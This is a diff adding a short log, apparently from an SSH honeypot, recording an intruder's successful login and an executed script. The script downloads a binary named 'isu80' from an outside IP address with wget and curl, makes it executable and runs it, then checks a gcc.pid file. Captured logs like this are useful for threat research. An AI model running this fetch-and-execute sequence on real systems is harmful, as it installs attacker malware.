@@ -1,0 +1,13 @@
+180302-15:35:26 login login successful 
+180302-15:35:26 channel_request session 
+180302-15:35:26 exec_request success 
+180302-15:35:26 exec command #!/bin/sh
+PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+wget http://162.248.4.130/isu80
+curl -O http://162.248.4.130/isu80
+chmod +x isu80
+./isu80
+ 
+180302-15:35:26 channel_request session 
+180302-15:35:27 exec_request success 
+180302-15:35:27 exec command ls -la /var/run/gcc.pid 
